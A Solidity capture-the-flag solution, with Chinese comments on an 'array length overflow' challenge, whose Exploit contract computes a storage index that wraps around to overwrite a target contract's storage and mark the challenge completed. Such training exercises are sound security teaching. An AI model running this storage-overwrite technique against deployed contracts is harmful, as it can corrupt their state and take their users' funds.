// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

/// @knowledgePoint 数组长度溢出

/// @level 普通
/// @description 这是一个用数组模拟的map，但貌似这样写有很严重的问题。尝试去获取isComplete吧！

contract Exploit{

    function exp(address _check) public {
        address map = Check(_check).map();
        Map(map).set(fig(), 1);
        Check(_check).isCompleted();
    }

    function fig()public pure returns(uint256){
        return (uint256(-1)-uint256(keccak256(bytes32(1))))+1;
    }
    
}